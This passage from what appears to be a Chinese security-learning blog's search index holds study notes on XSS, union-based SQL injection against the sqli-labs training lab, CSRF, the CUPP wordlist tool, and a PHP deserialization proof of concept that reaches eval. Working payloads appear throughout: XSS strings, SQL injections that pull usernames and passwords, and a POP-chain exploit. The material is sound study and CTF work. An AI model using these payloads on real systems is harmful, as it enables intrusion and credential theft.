class=\"string\">\"--&gt;&lt;img src=x onerror=alert(1)//\"</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>纯文本标签造成的混乱标记，例：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;style&gt;&lt;img src=<span class=\"string\">\"&lt;/style&gt;&lt;img src=x onerror=alert(1)//\"</span>&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"利用字符编码\"><a href=\"#利用字符编码\" class=\"headerlink\" title=\"利用字符编码\"></a>利用字符编码</h4><p>字符编码在跨站脚本中经常用到，透过这种技巧，不仅能让XSS绕过服务端的过滤，还能更好的隐藏shellcode<br>具体内容推荐博客<br><a href=\"https://blog.csdn.net/Fly_hps/article/details/82944455\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Fly_hps/article/details/82944455</a></p>\n","categories":["web安全"],"tags":["xss"]},{"title":"xss学习日记(四）","url":"/2019/11/04/note4/","content":"<h2 id=\"XSS漏洞发掘\"><a href=\"#XSS漏洞发掘\" class=\"headerlink\" title=\"XSS漏洞发掘\"></a>XSS漏洞发掘</h2><h4 id=\"记录几种发掘xss漏洞的方法\"><a href=\"#记录几种发掘xss漏洞的方法\" class=\"headerlink\" title=\"记录几种发掘xss漏洞的方法\"></a>记录几种发掘xss漏洞的方法<a id=\"more\"></a></h4><h4 id=\"主要有三种方法：白盒测试，黑盒测试，灰盒测试\"><a href=\"#主要有三种方法：白盒测试，黑盒测试，灰盒测试\" class=\"headerlink\" title=\"主要有三种方法：白盒测试，黑盒测试，灰盒测试\"></a>主要有三种方法：白盒测试，黑盒测试，灰盒测试</h4><h4 id=\"1-自动化测试工具-黑盒\"><a href=\"#1-自动化测试工具-黑盒\" class=\"headerlink\" title=\"1.自动化测试工具(黑盒)\"></a>1.自动化测试工具(黑盒)</h4><p>使用专业的xss漏洞自动化测试工具，能够快速有效的发掘漏洞，如Ratproxy(<a href=\"http://code.google.com/p/ratproxy/\" target=\"_blank\" rel=\"noopener\">http://code.google.com/p/ratproxy/</a>)</p>\n<h4 id=\"2-手动测试-黑盒\"><a href=\"#2-手动测试-黑盒\" class=\"headerlink\" title=\"2.手动测试(黑盒)\"></a>2.手动测试(黑盒)</h4><p>人工测试主要是配合查看客户端的HTML源文件发掘xss,输入<code>“&lt;script&gt;alert(0)&lt;/script&gt;”</code>等XSS攻击字符串并提交给应用程序的每个参数，然后监控这个输入的响应。如果目标程序没有对攻击字符串做出过滤,消毒和转义处理，就可以确认应用程序存在xss漏洞。<br>例如，如果针对页面的输入框进行测试，首先可以输入一些能触发xss的敏感字符，如：&lt;    &gt;    “    ‘    &amp;    #，如果这些基本字符都未被转义，则该输入框大概率存在xss漏洞，我们就可以再借此构造完整的xss代码进行测试。<br>或者我们也可以直接输入以下完整的xss代码进行尝试，如：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"string\">\"&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">=\"</span>&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">&lt;IMG src=<span class=\"string\">\"javascript:alert('XSS');\"</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>如果提交后发现页面出现排版问题或者JS错误，也说明这个输入框可能存在XSS漏洞。<br>关于这个方法，由安全研究者Rsanke维护的XSS语句列表中持续更新最新的xss语句，大家可以参考测试web应用程序是否存在xss漏洞。<br>传送：<a href=\"http://ha.ckers.org/xss.html\" target=\"_blank\" rel=\"noopener\">http://ha.ckers.org/xss.html</a></p>\n<h4 id=\"2-源代码安全审计-白盒）\"><a href=\"#2-源代码安全审计-白盒）\" class=\"headerlink\" title=\"2.源代码安全审计(白盒）\"></a>2.源代码安全审计(白盒）</h4><p>这里的源代码指的是web服务端的程序代码，如ASP,JSP,PHP等。<br>一般思路是：查找可能咋页面输出的变量，检验他们是否受到控制，然后跟踪这些变量的传递过程，分析他们是否被HTMLlencode()之类的函数过滤。<br>推荐一个大佬的操作实例，传送门：<a href=\"https://www.freebuf.com/articles/web/186163.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/articles/web/186163.html</a></p>\n<h4 id=\"3-JavaScript代码分析\"><a href=\"#3-JavaScript代码分析\" class=\"headerlink\" title=\"3.JavaScript代码分析\"></a>3.JavaScript代码分析</h4><p>由于Javascript功能强大，能控制Web客户端的逻辑，甚至能操作用户的输入与输出。在这个过程中，如果用户的恶意输入没有被正确处理就可能产生XSS。<br>记录一种特别的XSS—DOM-Based XSS.<br>前面的学习已经提到，DOM-Based XSS是基于DOM文档对象模型的一种漏洞，受客户端浏览器的脚本代码所影响。<br>记录一个例子：假设有如下代码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\"> &lt;head&gt;</span><br><span class=\"line\">  &lt;title&gt; DOM-XSS <span class=\"built_in\">test</span> &lt;/title&gt;</span><br><span class=\"line\"> &lt;/head&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\"> \t&lt;script&gt;</span><br><span class=\"line\"> \t\tvar a=document.URL;</span><br><span class=\"line\"> \t\t\tdocument.write(a.substring(a,indexOf(<span class=\"string\">\"a=\"</span>)+2,a.length));</span><br><span class=\"line\"> \t\t&lt;/script&gt;</span><br><span class=\"line\">  &lt;/body&gt;</span><br><span class=\"line\"> &lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>将以上代码保存在domXSS.html,中，然后用浏览器访问：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/domXSS.html?a=<span class=\"built_in\">test</span></span><br></pre></td></tr></table></figure>\n<p>页面打印出test信息，上述代码在解析URL过程中直接提取出a参数的值，并把这个值写入页面的HTML源代码中。<br>然而，攻击者可能会以Javascript代码作为a的参数的值，导致这段代码被动态的写入页面中。如构造一个恶意的请求地址：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(<span class=\"string\">'xss'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>当访问以上地址时，服务器返回包含上面脚本的HTML静态文本，浏览器会把HTML文本解析成DOM，并向服务器返回代码一样执行。结果如下图：<br><img src=\"https://img-blog.csdnimg.cn/20191104210540934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"1\"><br>由此可见，DOM XSS受客户端脚本代码的影响，分析客户端Javascript的方式，便能发掘出基于XSS的漏洞。</p>\n<p>国外安全研究员Amit Klein发表的一篇论文中详细的讲述了DOM-Based XSS的许多概念和技术，还列举了许多可能触发改漏洞的DOM对象，附上传送门：<br><a href=\"http://www.webappsec.org/projects/articles/071105.html\" target=\"_blank\" rel=\"noopener\">http://www.webappsec.org/projects/articles/071105.html</a></p>\n","categories":["web安全"],"tags":["xss"]},{"title":"SQL学习日记","url":"/2020/01/15/note6/","content":"<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><h3 id=\"1-概念及原理\"><a href=\"#1-概念及原理\" class=\"headerlink\" title=\"1.概念及原理\"></a>1.概念及原理</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，之后再将这些参数传递给后台的SQL服务器加以解析并执行，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。(百度百科)<a id=\"more\"></a></p>\n<h3 id=\"2-注入类型\"><a href=\"#2-注入类型\" class=\"headerlink\" title=\"2.注入类型\"></a>2.注入类型</h3><h5 id=\"参考文章https-www-cnblogs-com-zyh0430-p-11202429-html\"><a href=\"#参考文章https-www-cnblogs-com-zyh0430-p-11202429-html\" class=\"headerlink\" title=\"参考文章https://www.cnblogs.com/zyh0430/p/11202429.html\"></a>参考文章<code>https://www.cnblogs.com/zyh0430/p/11202429.html</code></h5><h3 id=\"3-sql基本流程\"><a href=\"#3-sql基本流程\" class=\"headerlink\" title=\"3.sql基本流程\"></a>3.sql基本流程</h3><p>假设当前URL为<code>http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1</code><br>(1)输入单引号 ‘ 进行检验是否存在输入</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1 ‘</span><br></pre></td></tr></table></figure>\n<p>(2)检验是字符型还是数字型</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli-labs-master/Less-2/index.php?  id=1%  and 1=2</span><br></pre></td></tr></table></figure>\n<p>   报错即为数字型<br>(3)查看这个网站所错在的表有几列</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=1 order by 3</span><br></pre></td></tr></table></figure>\n<p>使用二分法，如果输入错误则报错，如果存在就维持原状。<br>(4)进行 union select联合查询</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,3 %23</span><br></pre></td></tr></table></figure>\n<p>(5) 输入 version() 发现输出位查询数据库版本号</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,version() %23</span><br></pre></td></tr></table></figure>\n<p>(6)查询数据库所拥有的表名</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli-labs-master/Less-2/index.php?id=-1 union select1,2,group_concat(table_name)from information_schema.tables <span class=\"built_in\">where</span> table_schema = database() %23</span><br></pre></td></tr></table></figure>\n<p>(7)查询出users表里的列名</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2,group_concat(column_name)%20from information_schema.columns <span class=\"built_in\">where</span> table_schema = database() and table_name =<span class=\"string\">\"users\"</span>%23</span><br></pre></td></tr></table></figure>\n<p>(8)查出users表中username列中用户名</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2, group_concat(username) from security.users %23</span><br></pre></td></tr></table></figure>\n<p>(9)查出user表中的password列中密码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli-labs-master/Less-2/index.php? id=-1 union select 1,2, group_concat(password) from security.users %23</span><br></pre></td></tr></table></figure>\n<h3 id=\"sql注入实例-ctf\"><a href=\"#sql注入实例-ctf\" class=\"headerlink\" title=\"sql注入实例(ctf)\"></a>sql注入实例(ctf)</h3><p>“百度杯”CTF比赛 九月场SQLi</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://blog.csdn.net/weixin_40709439/article/details/82027422</span><br></pre></td></tr></table></figure>\n<p>“百度杯”CTF比赛 九月场SQL</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.jianshu.com/p/0a82851bb1c2</span><br></pre></td></tr></table></figure>\n\n","categories":["web安全"],"tags":["sql"]},{"title":"xss学习日记(五）","url":"/2019/11/06/note5/","content":"<h2 id=\"CSRF-跨站请求伪造\"><a href=\"#CSRF-跨站请求伪造\" class=\"headerlink\" title=\"CSRF(跨站请求伪造)\"></a>CSRF(跨站请求伪造)</h2><p>全称Cross-site request forgery，是一种利用网站对用户网页浏览器的信任来挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。<a id=\"more\"></a></p>\n<h5 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h5><p>当下的web应用大都使用cookie来识别用户身份，只要不退出或者关闭浏览器，以后访问该网站下的页面的时候，对于用户的每一个请求，Web浏览器都会主动附带该网站的cookie来标识身份，如此用户就不需要重新认证就可以被网站识别。<br>这时如果从第三方web页面发起对当前网站域下的请求，该请求也会带上当前网站的cookie（包括对Web页面中任意文件如IMG的请求），这种认证方式称之为隐式认证，攻击者正是利用该缺陷实施CSRF攻击。</p>\n<h5 id=\"示意图\"><a href=\"#示意图\" class=\"headerlink\" title=\"示意图\"></a>示意图</h5><p><img src=\"https://img-blog.csdnimg.cn/20191106200247637.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h5 id=\"常见CSRF方式\"><a href=\"#常见CSRF方式\" class=\"headerlink\" title=\"常见CSRF方式\"></a>常见CSRF方式</h5><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.&lt;img&gt;标签属性</span><br><span class=\"line\">&lt;img src=<span class=\"string\">\"http://www.te***.com/?command\"</span>&gt;</span><br><span class=\"line\">2.&lt;script&gt;标签属性</span><br><span class=\"line\">&lt;script src=<span class=\"string\">\"http://www.test.com/?command\"</span>&gt;</span><br><span class=\"line\">3.&lt;iframe&gt;</span><br><span class=\"line\">&lt;iframe src=<span class=\"string\">\"http://www.te***.com/?command\"</span>&gt;</span><br><span class=\"line\">4.JavaScript对象</span><br><span class=\"line\">（1）&lt;script&gt;</span><br><span class=\"line\">\tvar foo = new Image () ;</span><br><span class=\"line\">\tfoo.src = <span class=\"string\">\"http: / /www. te*** . com/ ?command\"</span>;</span><br><span class=\"line\">\t&lt;/script&gt;</span><br><span class=\"line\">（2）XMLHTTP</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">\tvar post_data = <span class=\"string\">' name-value '</span> ;</span><br><span class=\"line\">\tvar xmlhttp=new ActiveXobject ( <span class=\"string\">\"Microsoft. XMLHTTP\"</span>) ;</span><br><span class=\"line\">\txmlhttp. open (<span class=\"string\">\"POST\"</span>, <span class=\"string\">'http:/ / www. te*** . com/file.ext'</span>, \t\t\t<span class=\"literal\">true</span>):</span><br><span class=\"line\">\txmlhttp. onreadystatechange = <span class=\"keyword\">function</span> () </span><br><span class=\"line\">\t&#123;<span class=\"keyword\">if</span> (xmlhttp. readyState == 4)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">     \t alert (xmlhttp. responseText) ;      </span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\txmlhttp.send(post_data) ;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"攻击实例\"><a href=\"#攻击实例\" class=\"headerlink\" title=\"攻击实例\"></a>攻击实例</h4><p>推荐文章：<a href=\"https://www.2cto.com/article/201310/248996.html\" target=\"_blank\" rel=\"noopener\">https://www.2cto.com/article/201310/248996.html</a></p>\n","categories":["web安全"],"tags":["CSRF"]},{"title":"一个字典生成工具","url":"/2019/11/06/note7/","content":"<p>在逛论坛的时候偶然看到一个字典生成工具，叫CUPP，感觉挺有意思，于是在github上D下来试试看<a id=\"more\"></a>，github上搜索即得<br><img src=\"https://img-blog.csdnimg.cn/20200109200732805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\">用python3运行脚本cupp.py显示帮助<br><img src=\"https://img-blog.csdnimg.cn/2020010920105938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\">-h此菜单</p>\n<p>-i有关用户密码分析的交互式问题</p>\n<p>-w使用此选项来配置现有字典，</p>\n<p>或WyD.pl输出以制作一些pwnsauce</p>\n<p>-l从存储库下载巨大的单词列表</p>\n<p>-a直接从Alecto DB解析默认的用户名和密码。</p>\n<p>Project Alecto使用Phenoelit和CIRT的纯化数据库，这些数据库经过合并和增强。</p>\n<p>-v程序版本<br>我试验了使用cupp.py -i通过个人信息生成字典，这里可以看到它通过一些个人相关问题来收集信息<br><img src=\"https://img-blog.csdnimg.cn/20200109201934957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\">输入相关信息后自动生成字典在文件目录下<br><img src=\"https://img-blog.csdnimg.cn/20200109202048701.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\">拿自己的个人信息试了一下，发现了我一些账号的弱密码，再次感受到信息泄露的可怕，同时，它提醒我是时候把自己的那些弱密码账号清理掉了。</p>\n","categories":["tool"],"tags":["信息搜集"]},{"title":"PHP反序列化初总结","url":"/2020/05/23/note12/","content":"<p>碰到过很多次反序列化的审计，一直都没系统地去看，这两天看了不少博客，自己小小总结一下。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"什么是序列化与反序列化\"><a href=\"#什么是序列化与反序列化\" class=\"headerlink\" title=\"什么是序列化与反序列化\"></a>什么是序列化与反序列化</h3><p>序列化把一个对象变成可存储，可传输的字符串，并且在转换过程中保存变量的值和数据格式，反序列化把序列化后的字符串还原回对象使用，通过这个过程，可以方便数据的传输和存储，使程序更具维护性。</p>\n<p>对于PHP反序列化的过程，我们主要围绕两个函数：serialize()，unserialize()。</p>\n<p>那么为什么会产生PHP反序列化漏洞利用呢，这就要讲到PHP中几个特殊函数了。</p>\n<h3 id=\"魔术方法\"><a href=\"#魔术方法\" class=\"headerlink\" title=\"魔术方法\"></a>魔术方法</h3><p>在PHP的语法中，有一些系统自带的方法名，均以双下划线开头，它们会在特定的情况下被调用，即所谓的魔法函数。常见的魔术方法如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">__construct：在创建对象时候初始化对象，一般用于对变量赋初值。</span><br><span class=\"line\">__destruct：\t和构造函数相反，当对象所在函数调用完毕后执行。</span><br><span class=\"line\">__toString：\t当对象被当做一个字符串使用时调用。</span><br><span class=\"line\">__sleep:\t 序列化对象之前就调用此方法(其返回需要一个数组)</span><br><span class=\"line\">__wakeup:\t 反序列化恢复对象之前调用该方法</span><br><span class=\"line\">__call:\t \t 当调用对象中不存在的方法会自动调用该方法。</span><br><span class=\"line\">__get:  \t 在调用私有属性的时候会自动执行</span><br><span class=\"line\">__isset()：\t 在不可访问的属性上调用<span class=\"keyword\">isset</span>()或<span class=\"keyword\">empty</span>()触发</span><br><span class=\"line\">__unset()：\t 在不可访问的属性上使用<span class=\"keyword\">unset</span>()时触发</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://blog.csdn.net/weixin_42751456/article/details/88758908\" target=\"_blank\" rel=\"noopener\">这位师傅</a>的例子可以清晰的看到这些函数被调用的情况:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $variable = <span class=\"string\">'BUZZ'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $variable2 = <span class=\"string\">'OTHER'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">printvariable</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">$this</span>-&gt;variable.<span class=\"string\">'&lt;br /&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'__construct'</span>.<span class=\"string\">'&lt;br /&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'__destruct'</span>.<span class=\"string\">'&lt;br /&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'__wakeup'</span>.<span class=\"string\">'&lt;br /&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'__sleep'</span>.<span class=\"string\">'&lt;br /&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(<span class=\"string\">'variable'</span>,<span class=\"string\">'variable2'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//创建一个对象，回调用__construct</span></span><br><span class=\"line\">$object = <span class=\"keyword\">new</span> test();</span><br><span class=\"line\"><span class=\"comment\">//序列化一个对象，会调用__sleep</span></span><br><span class=\"line\">$serialized = serialize($object);</span><br><span class=\"line\"><span class=\"comment\">//输出序列化后的字符串</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">'Serialized:'</span>.$serialized.<span class=\"string\">'&lt;br /&gt;'</span>;</span><br><span class=\"line\"><span class=\"comment\">//重建对象，会调用__wakeup</span></span><br><span class=\"line\">$object2 = unserialize($serialized);</span><br><span class=\"line\"><span class=\"comment\">//调用printvariable,会输出数据(BUZZ)</span></span><br><span class=\"line\">$object2-&gt;printvariable();</span><br><span class=\"line\"><span class=\"comment\">//脚本结束，会调用__destruct</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/image-20200523140420068.png\" alt=\"image-20200523140420068\"></p>\n<p>由此我们可以设想，如果服务器没对我们提交的序列化字符串进行检测，直接将变量放到这些魔术方法中，那么我们是不是可以控制反序列化进程，从而达到代码执行，getshell的目的呢，答案是肯定的。一道<a href=\"https://www.freebuf.com/column/161798.html\" target=\"_blank\" rel=\"noopener\">这位师傅</a>的例子。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Example</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $handle;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">        </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;shutdown();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">shutdown</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;handle-&gt;close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Process</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> $pid;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">close</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">eval</span>(<span class=\"keyword\">$this</span>-&gt;pid);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'data'</span>]))&#123;</span><br><span class=\"line\">        $user_data = unserialize(urldecode($_GET[<span class=\"string\">'data'</span>]));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>分析下代码，有两个类Example，Process，Example类中有一个__destruct()魔术方法的析构函数(PHP5引入了析构函数的概念，这类似于其它面向对象的语言)，它会在脚本调用结束的时候执行，析构函数调用了本类中的一个成员函数shutdown()，其作用是调用某个地方的close()函数。Process类中有一个成员函数close()，其中包含eval函数，但其参数不可控。</p>\n<p>在PHP审计过程中，应当注意一些危险函数是否外部可控以及有没有进行正确过滤，因此这里我们的重点在eval()，如果我们能够将其参数变为可控，那么我们就可以执行任意代码，$pid的控制通过close()函数，Example类的成员函数shutdown()可以调用close()，所以如果把$handle作为Process的一个类对象，那么就可以通过shutdown()调用Process中的close()进而使得$pid可控。按照从思路构造poc如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Example</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> $handle;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">$this</span>-&gt;handle = <span class=\"keyword\">new</span> process();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Process</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> $pid;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">$this</span>-&gt;pid = <span class=\"string\">'phpinfo();'</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$test = <span class=\"keyword\">new</span> Example();</span><br><span class=\"line\">$payload = serialize($test);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $payload;</span><br></pre></td></tr></table></figure>\n\n<p>生成payload为：</p>\n<p><img src=\"/images/image-20200523152607619.png\" alt=\"image-20200523152607619\"></p>\n<p>当我们序列化的字符串进行反序列化时就会按照我们的设定生成一个Example类对象，当脚本结束时自动调用__destruct()函数，然后调用shutdown()函数，此时$handle为process的类对象，所以接下来会调用process的close()函数，eval()就会执行，而$pid也可以进行设置，此时就造成了代码执行。这里用到了pop链的思想，留个坑。</p>\n<p>传入参数getshell：</p>\n<p><img src=\"/images/image-20200523152752906.png\" alt=\"image-20200523152752906\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ul>\n<li>反序列化不同类型的应用以及pop链的寻找构造还有待学习</li>\n<li>该敲代码了</li>\n</ul>\n","categories":["PHP"],"tags":["serialize"]},{"title":"二分法进行sql盲注","url":"/2020/04/29/note10/","content":"<p>在学sql盲注脚本的时候碰到了使用二分法盲注字段的情况，学习一下。</p>\n<a id=\"more\"></a>\n\n<h4 id=\"环境：-CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#环境：-CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"环境： [CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>环境： [CISCN2019 华北赛区 Day2 Web1]Hack World</h4><p>复现地址：<a href='https://buuoj.cn/' target=\"_blank\" rel=\"noopener\">BUUCTF</a></p>\n<p>打开题目</p>\n<p><img src=\"/images/image-20200429185128033.png\" alt=\"image-20200429185128033\"></p>\n<p>直接告诉了flag在flag表和flag列里，让我们提交id。</p>\n<p>这道题过滤了一些字段以及常用注入语句，可以用Burpsuite来fuzz测试一下,如下所示，长度为482的代表被过滤</p>\n<p><img src=\"/images/image-20200429191528329.png\" alt=\"image-20200429191528329\"></p>\n<p>最后使用的方法是异或注入，有关异或注入的原理，可参考<a 